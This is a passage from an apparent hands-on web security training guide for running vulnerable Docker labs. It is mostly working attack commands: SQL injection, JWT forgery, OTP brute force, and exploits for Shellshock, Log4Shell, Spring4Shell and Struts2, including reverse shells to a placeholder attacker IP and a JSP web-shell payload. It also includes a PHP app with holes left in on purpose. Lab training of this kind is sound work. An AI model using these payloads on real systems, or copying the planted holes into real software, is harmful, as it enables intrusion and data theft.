  # ─── FIND THE SCOREBOARD ───
  # View page source or main.js → search for "score"
  # URL: http://localhost:3000/#/score-board

  # ─── EXPOSED METRICS ───
  curl http://localhost:3000/metrics
  # Prometheus metrics with internal info

  # ─── FTP DIRECTORY ───
  curl http://localhost:3000/ftp/
  # Lists files including:
  # - acquisitions.md
  # - coupons_2013.md.bak
  # - eastere.gg
  # - package.json.bak

  # Download backup files (null byte bypass):
  curl "http://localhost:3000/ftp/package.json.bak%2500.md"
  curl "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"

  # ─── API DOCUMENTATION ───
  # http://localhost:3000/api-docs  (if exposed)

  # ─── ERROR HANDLING ───
  # Trigger errors for stack traces:
  curl "http://localhost:3000/rest/products/search?q='"
  # Returns error with SQL query structure

  # ─── MAIN.JS ANALYSIS ───
  # Download and analyze the JavaScript bundle
  curl -s http://localhost:3000 | grep -oE 'src="[^"]*main[^"]*"'
  # Download the JS file and search for:
  # - API endpoints
  # - Admin routes
  # - Hidden features
  # - Hardcoded secrets
  ```
  :::
::

### OWASP WebGoat

::tabs
  :::tabs-item{icon="i-lucide-book-open" label="Setup & Structure"}
  ```bash [Terminal]
  # Deploy WebGoat
  docker run -d -p 8082:8080 -p 9090:9090 --name webgoat webgoat/webgoat

  # Access: http://localhost:8082/WebGoat
  # Register a new account (any credentials)

  # WebWolf (companion app): http://localhost:9090/WebWolf
  # Used for receiving callbacks, hosting files, email

  # ─── LESSON CATEGORIES ───
  # General        — HTTP basics, developer tools
  # Injection      — SQL, XSS, XXE, Path Traversal
  # Authentication — Auth bypass, JWT, Password Reset
  # Access Control — Insecure Direct Object Ref, Missing Function Level
  # Client Side    — HTML tampering, DOM XSS
  # Crypto         — Encoding, hashing, encryption
  # Server Side    — SSRF, request forgery
  # Challenges     — Final exam-style challenges
  ```
  :::

  :::tabs-item{icon="i-lucide-syringe" label="Example: SQL Injection Lesson"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  WEBGOAT — SQL INJECTION LESSONS
  # ═══════════════════════════════════════

  # Navigate: Injection → SQL Injection (intro)
  # Follow the guided lessons

  # ─── LESSON 2: String SQL Injection ───
  # Query: SELECT * FROM users WHERE name = '[input]'
  # Input: Smith' OR '1'='1
  # → Returns all rows

  # ─── LESSON 5: Advanced Union ───
  # Input: ' UNION SELECT 1, table_name, 3, 4, 5, 6, 7 
  #        FROM information_schema.tables--

  # ─── LESSON 9: Blind Injection ───
  # Register with name:
  # tom' AND substring(password,1,1)='t'--
  # If login succeeds → first char is 't'
  # Repeat for each character position

  # ─── LESSON 10: Blind (Advanced) ───
  # Use Burp Intruder or SQLMap:
  sqlmap -u "http://localhost:8082/WebGoat/SqlInjection/assignment5a" \
    --data="account=test&operator=test&injection=test" \
    --cookie="JSESSIONID=YOUR_SESSION" \
    --method=PUT --level=5 --risk=3 --batch
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Example: JWT Lessons"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  WEBGOAT — JWT TOKEN ATTACKS
  # ═══════════════════════════════════════

  # Navigate: Authentication → JWT tokens

  # ─── LESSON: JWT Decode ───
  # Decode the JWT from the lesson
  echo "eyJhbGciOiJIUzI1NiJ9..." | cut -d. -f2 | base64 -d 2>/dev/null

  # ─── LESSON: JWT None Algorithm ───
  # 1. Decode the header
  # 2. Change "alg" from "HS256" to "none"
  # 3. Change claims (username → admin)
  # 4. Remove signature (keep trailing dot)
  # 5. Submit modified token

  # Using jwt_tool:
  jwt_tool JWT_TOKEN -X a
  # Generates token with "alg":"none"

  # ─── LESSON: JWT Secret Brute Force ───
  # Crack the HS256 secret:
  jwt_tool JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt
  # Or hashcat:
  hashcat -a 0 -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

  # ─── LESSON: JWT Key Confusion ───
  # RS256 → HS256 attack
  # 1. Get the public key from the server
  # 2. Sign with HS256 using the public key as secret
  jwt_tool JWT_TOKEN -X k -pk public_key.pem
  ```
  :::
::

---

## API Security Lab

### crAPI — Completely Ridiculous API

::card
---
icon: i-lucide-plug
title: crAPI
---
OWASP's **flagship API security training platform**. Simulates a real-world car-related application with intentionally vulnerable REST APIs. Covers the **OWASP API Security Top 10** including BOLA, Broken Authentication, Excessive Data Exposure, Lack of Rate Limiting, and Mass Assignment.
::

::steps{level="4"}

#### Deploy crAPI

```bash [Terminal]
# Full crAPI deployment
git clone https://github.com/OWASP/crAPI.git
cd crAPI
docker-compose up -d

# Access:
# Web App:  http://localhost:8888
# Mailhog:  http://localhost:8025  (captures emails)
# API:      http://localhost:8888/api/

# Register an account through the web interface
# Check Mailhog for verification email
```

#### Testing — BOLA (Broken Object Level Authorization)

```bash [Terminal]
# ═══════════════════════════════════════
#  crAPI — BOLA / IDOR ATTACKS
# ═══════════════════════════════════════

# ─── STEP 1: Register two accounts ───
# Account A: attacker@test.com
# Account B: victim@test.com

# ─── STEP 2: Add a vehicle to Account B ───
# Login as victim → Add Vehicle → Note the vehicle ID

# ─── STEP 3: Access victim's vehicle as attacker ───
# Login as attacker (get JWT token)
TOKEN="YOUR_ATTACKER_JWT"

# Try accessing victim's vehicle
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/v2/vehicle/VICTIM_VEHICLE_UUID/location

# → Returns victim's vehicle location! (BOLA vulnerability)

# ─── STEP 4: Access victim's mechanic reports ───
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/v2/mechanic/mechanic_report?vehicle_id=VICTIM_VEHICLE_UUID

# ─── STEP 5: BOLA in community posts ───
# Get victim's post ID
# Try to modify it:
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/community/posts/VICTIM_POST_ID \
  -d '{"title":"Hacked!","content":"BOLA vulnerability"}'
```

#### Testing — Mass Assignment

```bash [Terminal]
# ═══════════════════════════════════════
#  crAPI — MASS ASSIGNMENT
# ═══════════════════════════════════════

# ─── STEP 1: Observe video conversion request ───
# Upload a video through the interface
# Intercept the conversion request in Burp

# ─── STEP 2: Mass assignment on profile update ───
# Normal profile update:
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/user/edit-profile \
  -d '{"name":"attacker","email":"attacker@test.com"}'

# Add hidden parameter:
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/user/edit-profile \
  -d '{"name":"attacker","email":"attacker@test.com","isAdmin":true}'

# ─── STEP 3: Coupon manipulation ───
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/coupon/validate-coupon \
  -d '{"coupon_code":"TRAC075","amount":-1000}'
# Negative amount = credit!
```

#### Testing — Rate Limiting & Auth Bypass

```bash [Terminal]
# ═══════════════════════════════════════
#  crAPI — RATE LIMITING & AUTH ATTACKS
# ═══════════════════════════════════════

# ─── OTP BRUTE FORCE (No Rate Limit) ───
# Request password reset for victim
curl -X POST http://localhost:8888/api/v2/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# Brute force the OTP (4-digit):
for otp in $(seq -w 0000 9999); do
  response=$(curl -s -X POST http://localhost:8888/api/v2/user/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@test.com\",\"otp\":\"$otp\",\"password\":\"NewPassword123!\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] OTP found: $otp"
    break
  fi
done

# ─── EXCESSIVE DATA EXPOSURE ───
# API returns more data than the frontend displays
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/v2/user/dashboard
# Check response for: credit card numbers, SSN, internal IDs

# ─── JWT MANIPULATION ───
# Decode the JWT
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Try modifying role/permissions
```

::

### VAmPI — Vulnerable REST API

::tabs
  :::tabs-item{icon="i-lucide-plug" label="Setup & Attack"}
  ```bash [Terminal]
  # Deploy VAmPI
  docker run -d -p 5001:5000 -e vulnerable=1 --name vampi erev0s/vampi

  # API Base: http://localhost:5001
  # Docs:     http://localhost:5001/ (shows all endpoints)

  # ─── REGISTER USER ───
  curl -X POST http://localhost:5001/users/v1/register \
    -H "Content-Type: application/json" \
    -d '{"username":"attacker","password":"attacker123","email":"attacker@test.com"}'

  # ─── LOGIN ───
  curl -X POST http://localhost:5001/users/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"attacker","password":"attacker123"}'
  # Save the auth_token

  TOKEN="YOUR_TOKEN"

  # ─── IDOR — ACCESS OTHER USERS ───
  curl http://localhost:5001/users/v1/admin \
    -H "Authorization: Bearer $TOKEN"
  # Returns admin user details!

  # ─── SQL INJECTION ───
  curl "http://localhost:5001/users/v1/attacker' OR 1=1--" \
    -H "Authorization: Bearer $TOKEN"

  # ─── MASS ASSIGNMENT — MAKE YOURSELF ADMIN ───
  curl -X PUT http://localhost:5001/users/v1/attacker \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"username":"attacker","email":"attacker@test.com","admin":true}'

  # ─── EXCESSIVE DATA EXPOSURE ───
  curl http://localhost:5001/users/v1/_debug \
    -H "Authorization: Bearer $TOKEN"
  # Returns all users with passwords!

  # ─── UNAUTHORIZED PASSWORD CHANGE ───
  curl -X PUT http://localhost:5001/users/v1/admin/password \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"password":"hacked123"}'
  ```
  :::

  :::tabs-item{icon="i-lucide-plug" label="DVGA — GraphQL Attacks"}
  ```bash [Terminal]
  # Deploy DVGA (Damn Vulnerable GraphQL Application)
  docker run -d -p 5013:5013 --name dvga dolevf/dvga

  # Access: http://localhost:5013
  # GraphiQL: http://localhost:5013/graphql

  # ─── INTROSPECTION QUERY ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

  # ─── EXTRACT ALL QUERIES ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{queryType{fields{name,description}}}}"}'

  # ─── EXTRACT ALL MUTATIONS ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{mutationType{fields{name,description}}}}"}'

  # ─── SQL INJECTION VIA GRAPHQL ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ pastes(filter:\"1 OR 1=1\") { id title content } }"}'

  # ─── IDOR — ACCESS OTHER PASTES ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ paste(id:1) { id title content owner { name } } }"}'

  # ─── DENIAL OF SERVICE (Nested Query) ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ pastes { owner { pastes { owner { pastes { id } } } } } }"}'

  # ─── OS COMMAND INJECTION ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { importPaste(host:\"localhost\", port:80, path:\"; id\", scheme:\"http\") { result } }"}'

  # ─── STORED XSS ───
  curl -X POST http://localhost:5013/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { createPaste(title:\"<script>alert(1)</script>\", content:\"xss\", public:true) { paste { id } } }"}'
  ```
  :::
::

---

## CVE Practice Environments

### Real-World CVE Labs

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Shellshock (CVE-2014-6271)"}
  ```bash [Terminal]
  # Deploy Shellshock environment
  docker run -d -p 8100:80 --name shellshock hmlio/vaas-cve-2014-6271

  # Access: http://localhost:8100
  # Vulnerable CGI script at: /cgi-bin/stats

  # ─── DETECT ───
  curl -H "User-Agent: () { :; }; echo; /bin/id" \
    http://localhost:8100/cgi-bin/stats
  # If you see "uid=..." → VULNERABLE

  # ─── READ FILES ───
  curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" \
    http://localhost:8100/cgi-bin/stats

  # ─── REVERSE SHELL ───
  # Start listener:
  nc -lvnp 4444

  # Trigger:
  curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" \
    http://localhost:8100/cgi-bin/stats

  # ─── METASPLOIT ───
  msfconsole -q
  use exploit/multi/http/apache_mod_cgi_bash_env_exec
  set RHOSTS 127.0.0.1
  set RPORT 8100
  set TARGETURI /cgi-bin/stats
  exploit
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="Log4Shell (CVE-2021-44228)"}
  ```bash [Terminal]
  # Deploy Log4Shell vulnerable app
  docker run -d -p 8102:8080 --name log4shell \
    ghcr.io/christophetd/log4shell-vulnerable-app

  # Access: http://localhost:8102

  # ─── DETECT (DNS callback) ───
  # Use Burp Collaborator or interactsh
  interactsh-client
  # Note your callback domain: xxxx.interact.sh

  curl -H "X-Api-Version: \${jndi:ldap://xxxx.interact.sh/a}" \
    http://localhost:8102/

  # If callback received → VULNERABLE

  # ─── DETECT (Various headers) ───
  curl -H "User-Agent: \${jndi:ldap://xxxx.interact.sh/ua}" \
    http://localhost:8102/

  curl -H "Referer: \${jndi:ldap://xxxx.interact.sh/ref}" \
    http://localhost:8102/

  curl -H "X-Forwarded-For: \${jndi:ldap://xxxx.interact.sh/xff}" \
    http://localhost:8102/

  # ─── EXPLOIT (RCE) ───
  # 1. Start LDAP redirect server (attacker machine)
  git clone https://github.com/mbechler/marshalsec.git
  cd marshalsec
  mvn clean package -DskipTests

  # 2. Create reverse shell class
  cat > Exploit.java << 'EOF'
  public class Exploit {
    static {
      try {
        Runtime.getRuntime().exec(new String[]{
          "/bin/bash","-c",
          "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
        });
      } catch (Exception e) {}
    }
  }
  EOF
  javac Exploit.java
  python3 -m http.server 8888

  # 3. Start LDAP server
  java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://YOUR_IP:8888/#Exploit" 1389

  # 4. Start listener
  nc -lvnp 4444

  # 5. Trigger
  curl -H "X-Api-Version: \${jndi:ldap://YOUR_IP:1389/Exploit}" \
    http://localhost:8102/
  # → Reverse shell!
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="Spring4Shell (CVE-2022-22965)"}
  ```bash [Terminal]
  # Deploy Spring4Shell vulnerable app
  docker run -d -p 8103:8080 --name spring4shell reznok/aspring4shell-poc

  # Access: http://localhost:8103

  # ─── EXPLOIT (Write Web Shell) ───
  # The exploit modifies Tomcat logging to write a JSP web shell

  curl -X POST "http://localhost:8103/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

  # ─── ACCESS WEB SHELL ───
  curl "http://localhost:8103/shell.jsp?pwd=j&cmd=id"
  curl "http://localhost:8103/shell.jsp?pwd=j&cmd=whoami"
  curl "http://localhost:8103/shell.jsp?pwd=j&cmd=cat+/etc/passwd"

  # ─── NUCLEI DETECTION ───
  nuclei -u http://localhost:8103 -t cves/2022/CVE-2022-22965.yaml
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="More CVE Labs"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  ADDITIONAL CVE PRACTICE LABS
  # ═══════════════════════════════════════

  # ─── VulnHub Docker CVE Collection ───
  # https://github.com/vulhub/vulhub
  git clone https://github.com/vulhub/vulhub.git
  cd vulhub

  # Each CVE has its own docker-compose
  # Examples:

  # ─── Apache Struts2 RCE (CVE-2017-5638) ───
  cd struts2/s2-045
  docker-compose up -d
  # Test:
  curl -H "Content-Type: %{(#_='multipart/form-data').\
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
  (#_memberAccess?(#_memberAccess=#dm):\
  ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
  (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
  (#ognlUtil.getExcludedPackageNames().clear()).\
  (#ognlUtil.getExcludedClasses().clear()).\
  (#context.setMemberAccess(#dm)))).\
  (#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
  (#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).\
  (#p=new java.lang.ProcessBuilder(#cmds)).\
  (#p.redirectErrorStream(true)).(#process=#p.start()).\
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
    http://localhost:8080/

  # ─── Drupalgeddon2 (CVE-2018-7600) ───
  cd ../../drupal/CVE-2018-7600
  docker-compose up -d
  # Access: http://localhost:8080

  # ─── Apache Path Traversal (CVE-2021-41773) ───
  cd ../../httpd/CVE-2021-41773
  docker-compose up -d
  curl "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

  # ─── Grafana Path Traversal (CVE-2021-43798) ───
  cd ../../grafana/CVE-2021-43798
  docker-compose up -d
  curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"

  # ─── Apache Tomcat Ghostcat (CVE-2020-1938) ───
  cd ../../tomcat/CVE-2020-1938
  docker-compose up -d

  # ─── CLEAN UP ANY LAB ───
  docker-compose down -v
  ```
  :::
::

---

## Custom Vulnerable App (Build Your Own)

::note
Building your own vulnerable application teaches you **both sides** — how vulnerabilities are created and how they're exploited.
::

::code-collapse
```dockerfile [Dockerfile]
# ═══════════════════════════════════════
#  CUSTOM VULNERABLE WEB APP
# ═══════════════════════════════════════
FROM php:7.4-apache

# Install extensions
RUN docker-php-ext-install mysqli pdo pdo_mysql
RUN apt-get update && apt-get install -y \
    curl netcat-traditional nano \
    && rm -rf /var/lib/apt/lists/*

# Enable Apache modules
RUN a2enmod rewrite

# Copy vulnerable application
COPY ./app /var/www/html/

# Set permissions
RUN chown -R www-data:www-data /var/www/html/
RUN chmod -R 755 /var/www/html/

EXPOSE 80
```
::

::code-collapse
```php [app/index.php]
<?php
// ═══════════════════════════════════════
//  CUSTOM VULNERABLE WEB APPLICATION
//  For educational purposes only!
// ═══════════════════════════════════════

$db = new mysqli("custom-db", "root", "root", "vulnapp");

// ─── SQL INJECTION (Login Bypass) ───
if (isset($_POST['login'])) {
    $user = $_POST['username'];  // No sanitization!
    $pass = $_POST['password'];
    $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $result = $db->query($query);
    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $_SESSION['user'] = $row['username'];
        $_SESSION['role'] = $row['role'];
        echo "<div class='success'>Welcome, " . $row['username'] . "!</div>";
    } else {
        // ─── VERBOSE ERROR (Information Disclosure) ───
        echo "<div class='error'>Login failed. Query: $query</div>";
    }
}

// ─���─ REFLECTED XSS ───
if (isset($_GET['search'])) {
    $search = $_GET['search'];  // No output encoding!
    echo "<h3>Search results for: $search</h3>";
}

// ─── COMMAND INJECTION ───
if (isset($_GET['ping'])) {
    $host = $_GET['ping'];  // No input validation!
    echo "<pre>" . shell_exec("ping -c 3 $host") . "</pre>";
}

// ─── LOCAL FILE INCLUSION ───
if (isset($_GET['page'])) {
    $page = $_GET['page'];  // No path validation!
    include($page);
}

// ─── INSECURE FILE UPLOAD ───
if (isset($_FILES['upload'])) {
    $target = "uploads/" . basename($_FILES['upload']['name']);
    // No extension check! No content validation!
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "Uploaded to: <a href='$target'>$target</a>";
}

// ─── IDOR ───
if (isset($_GET['user_id'])) {
    $id = $_GET['user_id'];  // No authorization check!
    $result = $db->query("SELECT * FROM users WHERE id=$id");
    $user = $result->fetch_assoc();
    echo "<pre>" . print_r($user, true) . "</pre>";
}

// ─── SSRF ───
if (isset($_GET['url'])) {
    $url = $_GET['url'];  // No URL validation!
    echo file_get_contents($url);
}

// ─── OPEN REDIRECT ───
if (isset($_GET['redirect'])) {
    header("Location: " . $_GET['redirect']);  // No validation!
    exit;
}
?>

<!DOCTYPE html>
<html>
<head><title>VulnApp</title></head>
<body>
<h1>Custom Vulnerable Application</h1>

<h2>Login (SQL Injection)</h2>
<form method="POST">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button name="login">Login</button>
</form>
<p>Try: <code>admin' OR 1=1--</code></p>

<h2>Search (XSS)</h2>
<form method="GET">
    <input name="search" placeholder="Search...">
    <button>Search</button>
</form>
<p>Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>

<h2>Ping (Command Injection)</h2>
<form method="GET">
    <input name="ping" placeholder="Enter IP">
    <button>Ping</button>
</form>
<p>Try: <code>127.0.0.1; id</code></p>

<h2>Include Page (LFI)</h2>
<p><a href="?page=../../../../../../etc/passwd">Read /etc/passwd</a></p>

<h2>File Upload (Web Shell)</h2>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload">
    <button>Upload</button>
</form>

<h2>User Profile (IDOR)</h2>
<p><a href="?user_id=1">User 1</a> | <a href="?user_id=2">User 2</a> | <a href="?user_id=3">User 3</a></p>

<h2>Fetch URL (SSRF)</h2>
<form method="GET">
    <input name="url" placeholder="Enter URL" value="http://169.254.169.254/latest/meta-data/">
    <button>Fetch</button>
</form>
</body>
</html>
```
::

::code-collapse
```yaml [docker-compose-custom.yml]
# Custom Vulnerable App Docker Compose
version: '3.8'

services:
  custom-app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: custom-vulnapp
    ports:
      - "8200:80"
    depends_on:
      - custom-db
    volumes:
      - ./app:/var/www/html
    restart: unless-stopped

  custom-db:
    image: mysql:5.7
    container_name: custom-db
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: vulnapp
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    restart: unless-stopped
```
::

::code-collapse
```sql [init.sql]
-- Database initialization for custom vulnerable app
USE vulnapp;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),
    email VARCHAR(100),
    role VARCHAR(20),
    ssn VARCHAR(11),
    credit_card VARCHAR(16)
);

INSERT INTO users VALUES
(1, 'admin', 'admin123', 'admin@vulnapp.com', 'admin', '123-45-6789', '4111111111111111'),
(2, 'john', 'password', 'john@vulnapp.com', 'user', '987-65-4321', '4222222222222222'),
(3, 'jane', 'jane2024', 'jane@vulnapp.com', 'user', '555-12-3456', '4333333333333333'),
(4, 'test', 'test', 'test@vulnapp.com', 'user', '111-22-3333', '4444444444444444');

CREATE TABLE secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50),
    value VARCHAR(200)
);

INSERT INTO secrets VALUES
(1, 'API_KEY', 'sk_live_4242424242424242'),
(2, 'DB_PASSWORD', 'SuperSecretDBPass!'),
(3, 'JWT_SECRET', 'my_super_secret_jwt_key'),
(4, 'AWS_ACCESS_KEY', 'AKIAIOSFODNN7EXAMPLE');
```
::

---

## Lab Management

### Docker Commands Cheat Sheet

::code-collapse
```bash [docker-lab-management.sh]
#!/bin/bash
# ═══════════════════════════════════════════════════════
#  DOCKER WEB SECURITY LAB — MANAGEMENT COMMANDS
# ═══════════════════════════════════════════════════════

LAB_DIR="$HOME/web-security-lab"

# ═══════════════════════════════════════
# LIFECYCLE MANAGEMENT
# ═══════════════════════════════════════

# Deploy entire lab
deploy_lab() {
    cd "$LAB_DIR"
    docker compose up -d
    echo "[+] Lab deployed. Waiting for services..."
    sleep 10
    docker compose ps
}

# Stop entire lab (preserves data)
stop_lab() {
    cd "$LAB_DIR"
    docker compose stop
    echo "[+] Lab stopped. Data preserved."
}

# Start lab (after stop)
start_lab() {
    cd "$LAB_DIR"
    docker compose start
    echo "[+] Lab started."
}

# Destroy lab (removes everything)
destroy_lab() {
    cd "$LAB_DIR"
    docker compose down -v --remove-orphans
    echo "[+] Lab destroyed. All data removed."
}

# Reset specific app
reset_app() {
    local app=$1
    cd "$LAB_DIR"
    docker compose rm -sf "$app"
    docker compose up -d "$app"
    echo "[+] $app has been reset."
}

# ═══════════════════════════════════════
# STATUS & MONITORING
# ═══════════════════════════════════════

# Show all running containers with ports
status() {
    echo "═══════════════════════════════════════"
    echo "  WEB SECURITY LAB STATUS"
    echo "═══════════════════════════════════════"
    docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" | sort
}

# Show resource usage
resources() {
    docker stats --no-stream --format \
      "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}"
}

# View logs for specific app
logs() {
    local app=${1:-"all"}
    if [ "$app" = "all" ]; then
        docker compose logs -f --tail=50
    else
        docker compose logs -f --tail=50 "$app"
    fi
}

# ═══════════════════════════════════════
# ACCESS & DEBUGGING
# ═══════════════════════════════════════

# Shell into container
shell() {
    local container=$1
    docker exec -it "$container" /bin/bash 2>/dev/null || \
    docker exec -it "$container" /bin/sh
}

# Execute command in container
run_in() {
    local container=$1
    shift
    docker exec -it "$container" "$@"
}

# ═══════════════════════════════════════
# HEALTH CHECK
# ═══════════════════════════════════════

health_check() {
    echo "═══════════════════════════════════════"
    echo "  HEALTH CHECK — WEB SECURITY LAB"
    echo "═══════════════════════════════════════"

    declare -A APPS=(
        ["DVWA"]="http://localhost:8081"
        ["Juice Shop"]="http://localhost:3000"
        ["WebGoat"]="http://localhost:8082/WebGoat"
        ["bWAPP"]="http://localhost:8083"
        ["Mutillidae"]="http://localhost:8084"
        ["crAPI"]="http://localhost:8888"
        ["VAmPI"]="http://localhost:5001"
        ["DVGA"]="http://localhost:5013"
        ["WordPress"]="http://localhost:8090"
        ["phpMyAdmin"]="http://localhost:8880"
        ["MailHog"]="http://localhost:8025"
    )

    for app in "${!APPS[@]}"; do
        url="${APPS[$app]}"
        code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 "$url" 2>/dev/null)
        if [ "$code" -ge 200 ] && [ "$code" -lt 400 ]; then
            echo "  ✅ $app ($url) — UP [$code]"
        else
            echo "  ❌ $app ($url) — DOWN [$code]"
        fi
    done
}

# ═══════════════════════════════════════
# CLEANUP
# ═══════════════════════════════════════

# Remove unused Docker resources
cleanup() {
    echo "[*] Removing unused containers..."
    docker container prune -f
    echo "[*] Removing unused images..."
    docker image prune -f
    echo "[*] Removing unused volumes..."
    docker volume prune -f
    echo "[*] Removing unused networks..."
    docker network prune -f
    echo "[+] Cleanup complete."
    echo "Disk usage:"
    docker system df
}

# ═══════════════════════════════════════
# SELECTIVE DEPLOYMENT
# ═══════════════════════════════════════

# Deploy only OWASP apps
deploy_owasp() {
    cd "$LAB_DIR"
    docker compose up -d dvwa juice-shop webgoat bwapp mutillidae
    echo "[+] OWASP apps deployed."
}

# Deploy only API targets
deploy_api() {
    cd "$LAB_DIR"
    docker compose up -d crapi-web vampi dvga vulnerable-api
    echo "[+] API targets deployed."
}

# Deploy only CMS targets
deploy_cms() {
    cd "$LAB_DIR"
    docker compose up -d wordpress wp-db joomla joomla-db drupal drupal-db
    echo "[+] CMS targets deployed."
}

# Deploy only CVE labs
deploy_cve() {
    cd "$LAB_DIR"
    docker compose up -d shellshock heartbleed log4shell spring4shell
    echo "[+] CVE labs deployed."
}

# ═══════════════════════════════════════
# USAGE
# ═══════════════════════════════════════
case "$1" in
    deploy)     deploy_lab ;;
    stop)       stop_lab ;;
    start)      start_lab ;;
    destroy)    destroy_lab ;;
    reset)      reset_app "$2" ;;
    status)     status ;;
    resources)  resources ;;
    logs)       logs "$2" ;;
    shell)      shell "$2" ;;
    health)     health_check ;;
    cleanup)    cleanup ;;
    owasp)      deploy_owasp ;;
    api)        deploy_api ;;
    cms)        deploy_cms ;;
    cve)        deploy_cve ;;
    *)
        echo "Usage: $0 {deploy|stop|start|destroy|reset|status|resources|logs|shell|health|cleanup|owasp|api|cms|cve}"
        echo ""
        echo "  deploy   — Deploy entire lab"
        echo "  stop     — Stop all containers (keep data)"
        echo "  start    — Start stopped containers"
        echo "  destroy  — Remove everything (data lost)"
        echo "  reset    — Reset specific app: $0 reset dvwa"
        echo "  status   — Show running containers"
        echo "  resources— Show CPU/RAM usage"
        echo "  logs     — View logs: $0 logs [app]"
        echo "  shell    — Shell into container: $0 shell dvwa"
        echo "  health   — Check all app health"
        echo "  cleanup  — Remove unused Docker resources"
        echo "  owasp    — Deploy OWASP apps only"
        echo "  api      — Deploy API targets only"
        echo "  cms      — Deploy CMS targets only"
        echo "  cve      — Deploy CVE labs only"
        ;;
esac
```
::

---

## Testing Methodology with Docker Lab

### Structured Practice Workflow

::steps{level="4"}

#### Select Target & Objective

```text
PRACTICE PLAN:
─────────────────────────────────────────
Week 1: SQL Injection
  ∙ DVWA (Low → Medium ��� High)
  ∙ Juice Shop SQLi challenges
  ∙ WebGoat SQL lessons
